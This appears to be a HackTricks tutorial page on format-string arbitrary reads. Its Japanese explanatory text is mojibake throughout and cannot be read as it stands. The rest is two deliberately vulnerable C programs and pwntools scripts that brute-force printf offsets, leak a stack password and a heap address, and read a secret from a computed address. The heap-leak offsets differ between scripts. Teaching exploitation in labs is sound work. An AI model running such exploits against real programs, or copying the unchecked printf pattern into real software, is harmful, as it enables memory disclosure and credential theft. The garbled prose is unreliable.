# ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ— - ä»»æ„ã®èª­ã¿å–ã‚Šä¾‹

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## ãƒã‚¤ãƒŠãƒªã®èª­ã¿å–ã‚Šé–‹å§‹

### ã‚³ãƒ¼ãƒ‰
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«æ–¹æ³•:
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### æ”»æ’ƒ
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
* **ã‚ªãƒ•ã‚»ãƒƒãƒˆã¯11**ã§ã™ã€‚ã„ãã¤ã‹ã®Aã‚’è¨­å®šã—ã€**ãƒ«ãƒ¼ãƒ—ã§ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã‚’è¡Œã„ã€ã‚ªãƒ•ã‚»ãƒƒãƒˆ0ã‹ã‚‰50ã¾ã§è¦‹ã¤ã‘ãŸçµæœã€ã‚ªãƒ•ã‚»ãƒƒãƒˆ11ã§5ã¤ã®ä½™åˆ†ãªæ–‡å­—ï¼ˆã“ã®å ´åˆã¯ãƒ‘ã‚¤ãƒ—`|`ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€å®Œå…¨ãªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’åˆ¶å¾¡ã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã—ãŸã€‚
* ç§ã¯**`%11$p`**ã‚’ä½¿ç”¨ã—ã€ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒã™ã¹ã¦0x4141414141414141ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã—ãŸã€‚
* **ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å‰ã«**é…ç½®ã•ã‚Œã¦ã„ã¾ã™ã€‚ãªãœãªã‚‰ã€**printfã¯ãƒŒãƒ«ãƒã‚¤ãƒˆã§èª­ã¿å–ã‚Šã‚’åœæ­¢**ã™ã‚‹ãŸã‚ã€ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’é€ä¿¡ã—ã¦ã‹ã‚‰ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã‚’é€ä¿¡ã™ã‚‹ã¨ã€printfã¯ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã«åˆ°é”ã™ã‚‹ã“ã¨ã¯ãªãã€ãƒŒãƒ«ãƒã‚¤ãƒˆãŒå…ˆã«è¦‹ã¤ã‹ã‚‹ã‹ã‚‰ã§ã™ã€‚
* é¸æŠã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã¯0x00400000ã§ã™ã€‚ã“ã‚Œã¯ãƒã‚¤ãƒŠãƒªã®é–‹å§‹åœ°ç‚¹ã§ã‚ã‚‹ãŸã‚ã§ã™ï¼ˆPIEãªã—ï¼‰

<figure><img src="broken-reference" alt="" width="477"><figcaption></figcaption></figure>

## ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’èª­ã‚€
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«æ–¹æ³•:
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰èª­ã¿å–ã‚‹

**`stack_password`** ã¯ãƒ­ãƒ¼ã‚«ãƒ«å¤‰æ•°ãªã®ã§ã€ã‚¹ã‚¿ãƒƒã‚¯ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚ãã®ãŸã‚ã€å˜ã« printf ã‚’æ‚ªç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã®å†…å®¹ã‚’è¡¨ç¤ºã™ã‚Œã°ååˆ†ã§ã™ã€‚ã“ã‚Œã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã«æœ€åˆã®100å€‹ã®ä½ç½®ã‚’BFã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã§ã™ã€‚
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
ç”»åƒã§ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰`10ç•ªç›®`ã®ä½ç½®ã«ã‚ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1233).png" alt="" width="338"><figcaption></figcaption></figure>

### ãƒ‡ãƒ¼ã‚¿ã®èª­ã¿å–ã‚Š

åŒã˜ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ãŒã€`%s`ã®ä»£ã‚ã‚Šã«`%p`ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ãƒ’ãƒ¼ãƒ—ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã€`%25$p`ã§ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ãƒ’ãƒ¼ãƒ—ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€æ¼æ´©ã—ãŸã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆ`0xaaaab7030894`ï¼‰ã‚’ãã®ãƒ—ãƒ­ã‚»ã‚¹å†…ã®ãƒ¡ãƒ¢ãƒªå†…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ä½ç½®ã¨æ¯”è¼ƒã™ã‚‹ã“ã¨ã§ã€ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å·®ã‚’å–å¾—ã§ãã¾ã™ã€‚

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

ã“ã‚Œã§ã€ã‚¹ã‚¿ãƒƒã‚¯å†…ã®1ã¤ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’åˆ¶å¾¡ã—ã¦ã€2ç•ªç›®ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®è„†å¼±æ€§ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹æ™‚ãŒæ¥ã¾ã—ãŸã€‚
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
ãã—ã¦ã€ä½¿ç”¨ã•ã‚ŒãŸãƒ‘ãƒƒã‚·ãƒ³ã‚°ã§**try 14**ã§ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’åˆ¶å¾¡ã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ **ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
